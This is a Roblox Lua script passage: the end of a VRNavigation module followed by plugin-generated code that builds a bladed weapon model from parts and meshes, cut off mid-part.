				self:BindJumpAction(false)
				self:SetLaserPointerMode("Disabled")
		
				if self.navigationRequestedConn then
					self.navigationRequestedConn:Disconnect()
					self.navigationRequestedConn = nil
				end
				if self.heartbeatConn then
					self.heartbeatConn:Disconnect()
					self.heartbeatConn = nil
				end
				if self.userCFrameEnabledConn then
					self.userCFrameEnabledConn:Disconnect()
					self.userCFrameEnabledConn = nil
				end
				self.enabled = false
			end
		end
		
		return VRNavigation
		
	end
}

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

--// Instances

local de3989fd03ud = Instance.new("SelectionBox")
de3989fd03ud.Visible = true
de3989fd03ud.Name = "DE#3989fd03ud"
de3989fd03ud.Parent = workspace

local ycsi = Instance.new("Model")
ycsi.WorldPivot = CFrame.fromMatrix(Vector3.new(-1.6762890815734863, 26.496734619140625, 17.019662857055664), Vector3.new(-8.597339729021769e-09, 1, 4.870344127994031e-09), Vector3.new(-0.9999998211860657, 8.597339729021769e-09, -1.4901161193847656e-08), Vector3.new(1.4901161193847656e-08, 4.870344127994031e-09, 0.9999999403953552))
ycsi.Name = "YCSI"
ycsi.Parent = de3989fd03ud

local red = Instance.new("UnionOperation")
red.UsePartColor = true
red.CFrame = CFrame.fromMatrix(Vector3.new(-1.9212994575500488, 26.642969131469727, 15.545909881591797), Vector3.new(-0.3209424614906311, -0.4829578101634979, 0.8147070407867432), Vector3.new(0.4441149830818176, -0.8365179300308228, -0.320934534072876), Vector3.new(0.8365151286125183, 0.258821964263916, 0.4829632043838501))
red.Color = Color3.new(0.972549, 0.972549, 0.972549)
red.Material = Enum.Material.Metal
red.Orientation = Vector3.new(-15, 60, -150)
red.Rotation = Vector3.new(-28.187000274658203, 56.77399826049805, -125.85399627685547)
red.Size = Vector3.new(0.7730454206466675, 0.4909447431564331, 0.7379218339920044)
red.size = Vector3.new(0.7730454206466675, 0.4909447431564331, 0.7379218339920044)
red.Name = "RED"
red.Parent = ycsi

local bullskullmini = Instance.new("UnionOperation")
bullskullmini.UsePartColor = true
bullskullmini.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
bullskullmini.CFrame = CFrame.fromMatrix(Vector3.new(-2.815952777862549, 26.529272079467773, 15.57761001586914), Vector3.new(0.0663205087184906, -0.5208635330200195, 0.8510597348213196), Vector3.new(0.8219732046127319, 0.51204913854599, 0.24932906031608582), Vector3.new(-0.5656507611274719, 0.6830130219459534, 0.4620954394340515))
bullskullmini.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
bullskullmini.Material = Enum.Material.DiamondPlate
bullskullmini.Orientation = Vector3.new(-43.08000183105469, -50.75400161743164, -45.48899841308594)
bullskullmini.Rotation = Vector3.new(-55.91999816894531, -34.446998596191406, -85.38700103759766)
bullskullmini.Size = Vector3.new(0.39513957500457764, 0.25094473361968994, 0.37718626856803894)
bullskullmini.size = Vector3.new(0.39513957500457764, 0.25094473361968994, 0.37718626856803894)
bullskullmini.Name = "Bull skull mini"
bullskullmini.Parent = ycsi

local union = Instance.new("UnionOperation")
union.UsePartColor = true
union.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
union.CFrame = CFrame.fromMatrix(Vector3.new(-1.8054394721984863, 26.375654220581055, 16.009563446044922), Vector3.new(0.9659262299537659, 7.152695502554707e-07, -0.25881707668304443), Vector3.new(0.23189225792884827, 0.4441138207912445, 0.8654417395591736), Vector3.new(0.1149449273943901, -0.8959704637527466, 0.42898109555244446))
union.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
union.Material = Enum.Material.Metal
union.Orientation = Vector3.new(63.632999420166016, 15, 0)
union.Rotation = Vector3.new(64.41500091552734, 6.599999904632568, -13.5)
union.Size = Vector3.new(0.14000612497329712, 0.1600213199853897, 0.05000000074505806)
union.size = Vector3.new(0.14000612497329712, 0.1600213199853897, 0.05000000074505806)
union.Parent = ycsi

local union_2 = Instance.new("UnionOperation")
union_2.UsePartColor = true
union_2.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
union_2.CFrame = CFrame.fromMatrix(Vector3.new(-2.3716931343078613, 26.529264450073242, 13.862971305847168), Vector3.new(-0.9659252762794495, -0.000001460304133615864, 0.2588203251361847), Vector3.new(0.2588203549385071, 0.000008238179361796938, 0.9659254550933838), Vector3.new(-0.000003551348754626815, 0.9999998807907104, -0.0000075746397669718135))
union_2.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
union_2.Material = Enum.Material.DiamondPlate
union_2.Orientation = Vector3.new(-90, -165, 0)
union_2.Rotation = Vector3.new(-90, 0, -165)
union_2.Size = Vector3.new(0.31499993801116943, 0.4200262427330017, 0.3149999976158142)
union_2.size = Vector3.new(0.31499993801116943, 0.4200262427330017, 0.3149999976158142)
union_2.Parent = ycsi

local red_2 = Instance.new("UnionOperation")
red_2.UsePartColor = true
red_2.CFrame = CFrame.fromMatrix(Vector3.new(-1.6757855415344238, 26.52903938293457, 16.53520393371582), Vector3.new(-0.9659256339073181, -0.0000013113024124322692, 0.25881895422935486), Vector3.new(-0.25881895422935486, -0.000007270253263413906, -0.9659256935119629), Vector3.new(0.000003156898173983791, -1, 0.0000066782658905140124))
red_2.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_2.Material = Enum.Material.Metal
red_2.Orientation = Vector3.new(90, -165, 0)
red_2.Rotation = Vector3.new(90, 0, 165)
red_2.Size = Vector3.new(0.2160152792930603, 0.7299250364303589, 0.20004712045192719)
red_2.size = Vector3.new(0.2160152792930603, 0.7299250364303589, 0.20004712045192719)
red_2.Name = "RED"
red_2.Parent = ycsi

local union_3 = Instance.new("UnionOperation")
union_3.UsePartColor = true
union_3.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
union_3.CFrame = CFrame.fromMatrix(Vector3.new(-2.216404438018799, 26.529268264770508, 14.442530632019043), Vector3.new(-0.9659250378608704, -0.0000012218854408274638, 0.25882023572921753), Vector3.new(0.25882020592689514, 0.000006940187631698791, 0.9659252762794495), Vector3.new(-0.000002985109631481464, 0.9999998807907104, -0.000006382585979736177))
union_3.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
union_3.Material = Enum.Material.DiamondPlate
union_3.Orientation = Vector3.new(-90, -165, 0)
union_3.Rotation = Vector3.new(-90, 0, -165)
union_3.Size = Vector3.new(0.28000131249427795, 1.1399282217025757, 0.2800000309944153)
union_3.size = Vector3.new(0.28000131249427795, 1.1399282217025757, 0.2800000309944153)
union_3.Parent = ycsi

local red_3 = Instance.new("UnionOperation")
red_3.UsePartColor = true
red_3.CFrame = CFrame.fromMatrix(Vector3.new(-1.4363903999328613, 26.529081344604492, 17.42862892150879), Vector3.new(0.9659256339073181, 0.000012665987014770508, -0.25881895422935486), Vector3.new(0.25881895422935486, -0.0000013970693544251844, 0.9659256935119629), Vector3.new(0.000011910200555576012, -1, -0.000004640244696929585))
red_3.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_3.Material = Enum.Material.Metal
red_3.Orientation = Vector3.new(90, 15, 0)
red_3.Rotation = Vector3.new(90, 0.0010000000474974513, -15)
red_3.Size = Vector3.new(0.5130035877227783, 0.6399962902069092, 0.19011130928993225)
red_3.size = Vector3.new(0.5130035877227783, 0.6399962902069092, 0.19011130928993225)
red_3.Name = "RED"
red_3.Parent = ycsi

local union_4 = Instance.new("UnionOperation")
union_4.UsePartColor = true
union_4.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
union_4.CFrame = CFrame.fromMatrix(Vector3.new(-1.802074909210205, 26.674196243286133, 16.008655548095703), Vector3.new(-0.9659251570701599, -7.152418106670666e-07, 0.25882095098495483), Vector3.new(0.23189789056777954, -0.44410136342048645, 0.8654466271400452), Vector3.new(0.11494209617376328, 0.8959766626358032, 0.4289689362049103))
union_4.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
union_4.Material = Enum.Material.Metal
union_4.Orientation = Vector3.new(-63.63399887084961, 15, 180)
union_4.Rotation = Vector3.new(-64.41600036621094, 6.599999904632568, -166.5)
union_4.Size = Vector3.new(0.13996034860610962, 0.16002652049064636, 0.05000000074505806)
union_4.size = Vector3.new(0.13996034860610962, 0.16002652049064636, 0.05000000074505806)
union_4.Parent = ycsi

local red_4 = Instance.new("UnionOperation")
red_4.UsePartColor = true
red_4.CFrame = CFrame.fromMatrix(Vector3.new(-1.5502820014953613, 26.529077529907227, 17.003671646118164), Vector3.new(-0.9659256339073181, -0.0000013113024124322692, 0.25881895422935486), Vector3.new(-0.25881895422935486, -0.000007274018116731895, -0.9659256935119629), Vector3.new(0.000003157872470183065, -1, 0.0000066819025050790515))
red_4.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_4.Material = Enum.Material.Metal
red_4.Orientation = Vector3.new(90, -165, 0)
red_4.Rotation = Vector3.new(90, 0, 165)
red_4.Size = Vector3.new(0.5130000114440918, 0.23999524116516113, 0.19003936648368835)
red_4.size = Vector3.new(0.5130000114440918, 0.23999524116516113, 0.19003936648368835)
red_4.Name = "RED"
red_4.Parent = ycsi

local union_5 = Instance.new("UnionOperation")
union_5.UsePartColor = true
union_5.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
union_5.CFrame = CFrame.fromMatrix(Vector3.new(-2.3516125679016113, 26.529264450073242, 13.937922477722168), Vector3.new(-0.9659250378608704, -0.0000012218854408274638, 0.25882023572921753), Vector3.new(0.25882020592689514, 0.000006940187631698791, 0.9659252762794495), Vector3.new(-0.000002985109631481464, 0.9999998807907104, -0.000006382585979736177))
union_5.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
union_5.Material = Enum.Material.Metal
union_5.Orientation = Vector3.new(-90, -165, 0)
union_5.Rotation = Vector3.new(-90, 0, -165)
union_5.Size = Vector3.new(0.3500000238418579, 0.15512241423130035, 0.3500000238418579)
union_5.size = Vector3.new(0.3500000238418579, 0.15512241423130035, 0.3500000238418579)
union_5.Parent = ycsi

local union_6 = Instance.new("UnionOperation")
union_6.UsePartColor = true
union_6.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
union_6.CFrame = CFrame.fromMatrix(Vector3.new(-2.2888760566711426, 26.529264450073242, 14.172053337097168), Vector3.new(-0.9659250378608704, -0.0000012218854408274638, 0.25882023572921753), Vector3.new(0.25882020592689514, 0.000006940187631698791, 0.9659252762794495), Vector3.new(-0.000002985109631481464, 0.9999998807907104, -0.000006382585979736177))
union_6.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
union_6.Material = Enum.Material.Metal
union_6.Orientation = Vector3.new(-90, -165, 0)
union_6.Rotation = Vector3.new(-90, 0, -165)
union_6.Size = Vector3.new(0.3010002374649048, 0.25996559858322144, 0.30100002884864807)
union_6.size = Vector3.new(0.3010002374649048, 0.25996559858322144, 0.30100002884864807)
union_6.Parent = ycsi

local union_7 = Instance.new("UnionOperation")
union_7.UsePartColor = true
union_7.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
union_7.CFrame = CFrame.fromMatrix(Vector3.new(-2.187931537628174, 26.529268264770508, 14.548792839050293), Vector3.new(-0.9659250378608704, -0.0000012218854408274638, 0.25882023572921753), Vector3.new(0.25882020592689514, 0.000006940187631698791, 0.9659252762794495), Vector3.new(-0.000002985109631481464, 0.9999998807907104, -0.000006382585979736177))
union_7.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
union_7.Material = Enum.Material.Metal
union_7.Orientation = Vector3.new(-90, -165, 0)
union_7.Rotation = Vector3.new(-90, 0, -165)
union_7.Size = Vector3.new(0.30100032687187195, 0.3399674594402313, 0.30100002884864807)
union_7.size = Vector3.new(0.30100032687187195, 0.3399674594402313, 0.30100002884864807)
union_7.Parent = ycsi

local red_5 = Instance.new("UnionOperation")
red_5.UsePartColor = true
red_5.CFrame = CFrame.fromMatrix(Vector3.new(-1.6887555122375488, 26.529035568237305, 16.486894607543945), Vector3.new(-0.9659256339073181, -0.0000013113024124322692, 0.25881895422935486), Vector3.new(-0.25881895422935486, -0.000007270253263413906, -0.9659256935119629), Vector3.new(0.000003156898173983791, -1, 0.0000066782658905140124))
red_5.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_5.Material = Enum.Material.Metal
red_5.Orientation = Vector3.new(90, -165, 0)
red_5.Rotation = Vector3.new(90, 0, 165)
red_5.Size = Vector3.new(0.45900022983551025, 0.829987645149231, 0.19021397829055786)
red_5.size = Vector3.new(0.45900022983551025, 0.829987645149231, 0.19021397829055786)
red_5.Name = "RED"
red_5.Parent = ycsi

local union_8 = Instance.new("UnionOperation")
union_8.UsePartColor = true
union_8.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
union_8.CFrame = CFrame.fromMatrix(Vector3.new(-2.087009906768799, 26.529272079467773, 14.925440788269043), Vector3.new(-0.9659250378608704, -0.0000012218854408274638, 0.25882023572921753), Vector3.new(0.25882020592689514, 0.000006940187631698791, 0.9659252762794495), Vector3.new(-0.000002985109631481464, 0.9999998807907104, -0.000006382585979736177))
union_8.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
union_8.Material = Enum.Material.Metal
union_8.Orientation = Vector3.new(-90, -165, 0)
union_8.Rotation = Vector3.new(-90, 0, -165)
union_8.Size = Vector3.new(0.3010002374649048, 0.2599884867668152, 0.30100002884864807)
union_8.size = Vector3.new(0.3010002374649048, 0.2599884867668152, 0.30100002884864807)
union_8.Parent = ycsi

local bladeholderinner = Instance.new("UnionOperation")
bladeholderinner.UsePartColor = true
bladeholderinner.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
bladeholderinner.CFrame = CFrame.fromMatrix(Vector3.new(-1.91752290725708, 26.52928352355957, 15.790584564208984), Vector3.new(0.11919744312763214, 0.000006369830771291163, 0.9928699135780334), Vector3.new(0.9928696751594543, 0.0000024317084807989886, -0.11919735372066498), Vector3.new(-0.0000032021380320657045, 0.9999998807907104, -0.000006041072538209846))
bladeholderinner.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
bladeholderinner.Material = Enum.Material.DiamondPlate
bladeholderinner.Orientation = Vector3.new(-90, -83.15399932861328, 0)
bladeholderinner.Rotation = Vector3.new(-90, 0, -83.15399932861328)
bladeholderinner.Size = Vector3.new(0.9423960447311401, 0.6190026998519897, 0.24500073492527008)
bladeholderinner.size = Vector3.new(0.9423960447311401, 0.6190026998519897, 0.24500073492527008)
bladeholderinner.Name = "blade holder inner"
bladeholderinner.Parent = ycsi

local red_6 = Instance.new("UnionOperation")
red_6.UsePartColor = true
red_6.CFrame = CFrame.fromMatrix(Vector3.new(-1.332836627960205, 26.52924156188965, 18.22782325744629), Vector3.new(-8.597339729021769e-09, 1, 4.870344127994031e-09), Vector3.new(-0.9999998211860657, 8.597339729021769e-09, -1.4901161193847656e-08), Vector3.new(1.4901161193847656e-08, 4.870344127994031e-09, 0.9999999403953552))
red_6.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_6.Material = Enum.Material.SmoothPlastic
red_6.Orientation = Vector3.new(0, 0, 90)
red_6.Rotation = Vector3.new(0, 0, 90)
red_6.Size = Vector3.new(0.19252759218215942, 1.5329747200012207, 4.740862846374512)
red_6.size = Vector3.new(0.19252759218215942, 1.5329747200012207, 4.740862846374512)
red_6.Name = "RED"
red_6.Parent = ycsi

local red_7 = Instance.new("UnionOperation")
red_7.UsePartColor = true
red_7.CFrame = CFrame.fromMatrix(Vector3.new(-1.3975567817687988, 26.529085159301758, 17.573572158813477), Vector3.new(-0.9659256339073181, -0.0000013113024124322692, 0.25881895422935486), Vector3.new(-0.25881895422935486, -0.000007254764113895362, -0.9659256935119629), Vector3.new(0.000003152889121338376, -1, 0.000006663304247922497))
red_7.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_7.Material = Enum.Material.Metal
red_7.Orientation = Vector3.new(90, -165, 0)
red_7.Rotation = Vector3.new(90, 0, 165)
red_7.Size = Vector3.new(0.35100021958351135, 3.4599013328552246, 0.20012745261192322)
red_7.size = Vector3.new(0.35100021958351135, 3.4599013328552246, 0.20012745261192322)
red_7.Name = "RED"
red_7.Parent = ycsi

local red_8 = Instance.new("UnionOperation")
red_8.UsePartColor = true
red_8.CFrame = CFrame.fromMatrix(Vector3.new(-1.2368969917297363, 26.529233932495117, 17.53397560119629), Vector3.new(-0.000009074419722310267, -0.9999998807907104, -0.000031369909265777096), Vector3.new(0.983538031578064, -0.000003233242523492663, -0.18069860339164734), Vector3.new(0.18069866299629211, -0.000032462157832924277, 0.9835382699966431))
red_8.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_8.Material = Enum.Material.SmoothPlastic
red_8.Orientation = Vector3.new(0.0020000000949949026, 10.40999984741211, -90)
red_8.Rotation = Vector3.new(0.0020000000949949026, 10.40999984741211, -90.0009994506836)
red_8.Size = Vector3.new(0.19251206517219543, 0.45236241817474365, 3.67093563079834)
red_8.size = Vector3.new(0.19251206517219543, 0.45236241817474365, 3.67093563079834)
red_8.Name = "RED"
red_8.Parent = ycsi

local handlebar = Instance.new("UnionOperation")
handlebar.UsePartColor = true
handlebar.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
handlebar.CFrame = CFrame.fromMatrix(Vector3.new(-1.9957165718078613, 26.52928352355957, 15.30478286743164), Vector3.new(-0.25882017612457275, -0.0000067886321630794555, -0.9659251570701599), Vector3.new(-0.9659247994422913, -0.0000014603039062421885, 0.25882014632225037), Vector3.new(-0.000003176179006914026, 0.9999998807907104, -0.000006174487225507619))
handlebar.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
handlebar.Material = Enum.Material.DiamondPlate
handlebar.Orientation = Vector3.new(-90, 105, 0)
handlebar.Rotation = Vector3.new(-90, 0, 105)
handlebar.Size = Vector3.new(0.2800000309944153, 1.5, 0.24500000476837158)
handlebar.size = Vector3.new(0.2800000309944153, 1.5, 0.24500000476837158)
handlebar.Name = "handle bar"
handlebar.Parent = ycsi

local handlebar3 = Instance.new("UnionOperation")
handlebar3.UsePartColor = true
handlebar3.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
handlebar3.CFrame = CFrame.fromMatrix(Vector3.new(-1.1297192573547363, 26.52927589416504, 15.14649486541748), Vector3.new(0.36809277534484863, 0.5208751559257507, 0.7701923847198486), Vector3.new(-0.5871831774711609, -0.5120425820350647, 0.6269186735153198), Vector3.new(0.7209180593490601, -0.68300861120224, 0.11737027764320374))
handlebar3.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
handlebar3.Material = Enum.Material.DiamondPlate
handlebar3.Orientation = Vector3.new(43.07899856567383, 80.75299835205078, 134.50999450683594)
handlebar3.Rotation = Vector3.new(80.2490005493164, 46.130001068115234, 57.91699981689453)
handlebar3.Size = Vector3.new(0.39513957500457764, 0.25094473361968994, 0.37718626856803894)
handlebar3.size = Vector3.new(0.39513957500457764, 0.25094473361968994, 0.37718626856803894)
handlebar3.Name = "handle bar 3"
handlebar3.Parent = ycsi

local red_9 = Instance.new("UnionOperation")
red_9.UsePartColor = true
red_9.CFrame = CFrame.fromMatrix(Vector3.new(-2.00413179397583, 26.447362899780273, 15.23493480682373), Vector3.new(0.6573715806007385, -0.2938205599784851, 0.6939240097999573), Vector3.new(0.4999539256095886, -0.5189486145973206, -0.693352222442627), Vector3.new(0.5638322234153748, 0.8027206063270569, -0.19424572587013245))
red_9.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_9.Material = Enum.Material.Wood
red_9.Orientation = Vector3.new(-53.39099884033203, 109.00900268554688, -150.48199462890625)
red_9.Rotation = Vector3.new(-103.60299682617188, 34.32099914550781, -37.25400161743164)
red_9.Size = Vector3.new(0.9523897767066956, 0.821678102016449, 0.9072744846343994)
red_9.size = Vector3.new(0.9523897767066956, 0.821678102016449, 0.9072744846343994)
red_9.Name = "RED"
red_9.Parent = ycsi

local red_10 = Instance.new("UnionOperation")
red_10.UsePartColor = true
red_10.CFrame = CFrame.fromMatrix(Vector3.new(-2.0830655097961426, 26.362192153930664, 15.0791654586792), Vector3.new(-0.9500144124031067, -0.29536351561546326, -0.10114830732345581), Vector3.new(0.22623097896575928, -0.42800864577293396, -0.8750008344650269), Vector3.new(0.21515096724033356, -0.8541468381881714, 0.4734354615211487))
red_10.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_10.Material = Enum.Material.Wood
red_10.Orientation = Vector3.new(58.66600036621094, 24.43899917602539, -145.39100646972656)
red_10.Rotation = Vector3.new(61.000999450683594, 12.423999786376953, -166.60499572753906)
red_10.Size = Vector3.new(0.5890360474586487, 0.5919809937477112, 0.46839502453804016)
red_10.size = Vector3.new(0.5890360474586487, 0.5919809937477112, 0.46839502453804016)
red_10.Name = "RED"
red_10.Parent = ycsi

local outerbladeholder = Instance.new("UnionOperation")
outerbladeholder.UsePartColor = true
outerbladeholder.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
outerbladeholder.CFrame = CFrame.fromMatrix(Vector3.new(-1.935986042022705, 26.52918815612793, 15.573360443115234), Vector3.new(-0.0000057667994042276405, -0.9999998807907104, -0.00000739581992093008), Vector3.new(-0.880132257938385, 0.000001613997255844879, 0.4747275114059448), Vector3.new(-0.47472748160362244, 0.000009229614079231396, -0.8801321983337402))
outerbladeholder.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
outerbladeholder.Material = Enum.Material.Metal
outerbladeholder.Orientation = Vector3.new(-0.0010000000474974513, -151.6580047607422, -90)
outerbladeholder.Rotation = Vector3.new(-179.99899291992188, -28.341999053955078, 90)
outerbladeholder.Size = Vector3.new(0.24316373467445374, 0.8381764888763428, 0.3999840021133423)
outerbladeholder.size = Vector3.new(0.24316373467445374, 0.8381764888763428, 0.3999840021133423)
outerbladeholder.Name = "outer blade holder"
outerbladeholder.Parent = ycsi

local red_11 = Instance.new("UnionOperation")
red_11.UsePartColor = true
red_11.CFrame = CFrame.fromMatrix(Vector3.new(-1.8570904731750488, 26.529298782348633, 15.826709747314453), Vector3.new(0.2588188052177429, 0.00000708683546690736, 0.9659252166748047), Vector3.new(-0.000011557326615729835, 0.9999994039535522, -0.000004175781668891432), Vector3.new(-0.9659255146980286, -0.000010073185876535717, 0.2588188946247101))
red_11.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_11.Material = Enum.Material.Metal
red_11.Orientation = Vector3.new(0.0010000000474974513, -75, 0)
red_11.Rotation = Vector3.new(0.0020000000949949026, -75, 0.003000000026077032)
red_11.Size = Vector3.new(0.14565938711166382, 0.17500774562358856, 1.729067325592041)
red_11.size = Vector3.new(0.14565938711166382, 0.17500774562358856, 1.729067325592041)
red_11.Name = "RED"
red_11.Parent = ycsi

local parrybarouter = Instance.new("UnionOperation")
parrybarouter.UsePartColor = true
parrybarouter.BrickColor = BrickColor.new(0.06666667014360428, 0.06666667014360428, 0.06666667014360428)
parrybarouter.CFrame = CFrame.fromMatrix(Vector3.new(-1.8147473335266113, 26.531991958618164, 16.04275131225586), Vector3.new(0.6002646684646606, -0.7071020007133484, 0.37374767661094666), Vector3.new(0.5285525918006897, -0.00000368353084923001, -0.8489000797271729), Vector3.new(0.6002601385116577, 0.707110583782196, 0.37373870611190796))
parrybarouter.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
parrybarouter.Material = Enum.Material.Metal
parrybarouter.Orientation = Vector3.new(-45, 58.09199905395508, -90)
parrybarouter.Rotation = Vector3.new(-62.141998291015625, 36.888999938964844, -41.3650016784668)
parrybarouter.Size = Vector3.new(1.0373802185058594, 1.5387669801712036, 1.0312726497650146)
parrybarouter.size = Vector3.new(1.0373802185058594, 1.5387669801712036, 1.0312726497650146)
parrybarouter.Name = "parry bar outer"
parrybarouter.Parent = ycsi

local red_12 = Instance.new("UnionOperation")
red_12.UsePartColor = true
red_12.CFrame = CFrame.fromMatrix(Vector3.new(-1.93351411819458, 26.406919479370117, 15.549175262451172), Vector3.new(0.6852961182594299, 0.4829675853252411, 0.545079231262207), Vector3.new(-0.5450851321220398, 0.8365151882171631, -0.05589120090007782), Vector3.new(-0.4829607605934143, -0.25881248712539673, 0.8365194797515869))
red_12.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_12.Material = Enum.Material.Metal
red_12.Orientation = Vector3.new(15, -30, 30)
red_12.Rotation = Vector3.new(17.191999435424805, -28.878999710083008, 38.499000549316406)
red_12.Size = Vector3.new(0.7730454206466675, 0.4909447431564331, 0.7379218339920044)
red_12.size = Vector3.new(0.7730454206466675, 0.4909447431564331, 0.7379218339920044)
red_12.Name = "RED"
red_12.Parent = ycsi

local red_13 = Instance.new("Part")
red_13.BackSurface = Enum.SurfaceType.Weld
red_13.BottomSurface = Enum.SurfaceType.Weld
red_13.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_13.CFrame = CFrame.fromMatrix(Vector3.new(-2.5314526557922363, 26.529260635375977, 13.776537895202637), Vector3.new(0.000003277565838288865, -0.9999998807907104, 0.000006322572971839691), Vector3.new(-0.258819043636322, -0.000006957913683436345, -0.9659258127212524), Vector3.new(0.9659256339073181, 0.0000015199182143987855, -0.25881901383399963))
red_13.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_13.FrontSurface = Enum.SurfaceType.Weld
red_13.LeftSurface = Enum.SurfaceType.Weld
red_13.Material = Enum.Material.Fabric
red_13.Orientation = Vector3.new(0, 105, -90)
red_13.RightSurface = Enum.SurfaceType.Weld
red_13.Rotation = Vector3.new(180, 75, 89.9990005493164)
red_13.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_13.TopSurface = Enum.SurfaceType.Weld
red_13.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_13.Name = "RED"
red_13.Parent = ycsi

local mesh = Instance.new("SpecialMesh")
mesh.MeshType = Enum.MeshType.FileMesh
mesh.MeshId = "http://www.roblox.com/asset/?id=36869983"
mesh.Scale = Vector3.new(0.10000000149011612, 0.15000000596046448, 0.05000000074505806)
mesh.Parent = red_13

local red_14 = Instance.new("Part")
red_14.BackSurface = Enum.SurfaceType.Weld
red_14.BottomSurface = Enum.SurfaceType.Weld
red_14.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_14.CFrame = CFrame.fromMatrix(Vector3.new(-2.405857563018799, 26.65926170349121, 13.742884635925293), Vector3.new(-0.9659256339073181, -0.0000015199182143987855, 0.25881901383399963), Vector3.new(-0.258819043636322, -0.000006957913683436345, -0.9659258127212524), Vector3.new(0.000003277565838288865, -0.9999998807907104, 0.000006322572971839691))
red_14.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_14.FrontSurface = Enum.SurfaceType.Weld
red_14.LeftSurface = Enum.SurfaceType.Weld
red_14.Material = Enum.Material.Fabric
red_14.Orientation = Vector3.new(90, -165, 0)
red_14.RightSurface = Enum.SurfaceType.Weld
red_14.Rotation = Vector3.new(90, 0, 165)
red_14.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_14.TopSurface = Enum.SurfaceType.Weld
red_14.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_14.Name = "RED"
red_14.Parent = ycsi

local mesh_2 = Instance.new("SpecialMesh")
mesh_2.MeshType = Enum.MeshType.FileMesh
mesh_2.MeshId = "http://www.roblox.com/asset/?id=36869983"
mesh_2.Scale = Vector3.new(0.10000000149011612, 0.15000000596046448, 0.05000000074505806)
mesh_2.Parent = red_14

local red_15 = Instance.new("Part")
red_15.BackSurface = Enum.SurfaceType.Weld
red_15.BottomSurface = Enum.SurfaceType.Weld
red_15.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
red_15.CFrame = CFrame.fromMatrix(Vector3.new(-2.270641803741455, 26.529260635375977, 13.706652641296387), Vector3.new(-0.000003277565838288865, 0.9999998807907104, -0.000006322572971839691), Vector3.new(-0.258819043636322, -0.000006957913683436345, -0.9659258127212524), Vector3.new(-0.9659256339073181, -0.0000015199182143987855, 0.25881901383399963))
red_15.Color = Color3.new(0.972549, 0.972549, 0.972549)
red_15.FrontSurface = Enum.SurfaceType.Weld
red_15.LeftSurface = Enum.SurfaceType.Weld
red_15.Material = Enum.Material.Fabric
red_15.Orientation = Vector3.new(0, -75, 90)
red_15.RightSurface = Enum.SurfaceType.Weld
red_15.Rotation = Vector3.new(0, -75, 90.0009994506836)
red_15.Size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_15.TopSurface = Enum.SurfaceType.Weld
red_15.size = Vector3.new(0.20000000298023224, 0.20000000298023224, 0.20000000298023224)
red_15.Name = "RED"
red_15.Parent = ycsi

local mesh_3 = Instance.new("SpecialMesh")
mesh_3.MeshType = Enum.MeshType.FileMesh
mesh_3.MeshId = "http://www.roblox.com/asset/?id=36869983"
mesh_3.Scale = Vector3.new(0.10000000149011612, 0.15000000596046448, 0.05000000074505806)
mesh_3.Parent = red_15

local red_16 = Instance.new("Part")
red_16.BackSurface = Enum.SurfaceType.Weld
red_16.BottomSurface = Enum.SurfaceType.Weld
red_16.BrickColor = BrickColor.new(0.9725490808486938, 0.9725490808486938, 0.9725490808486938)
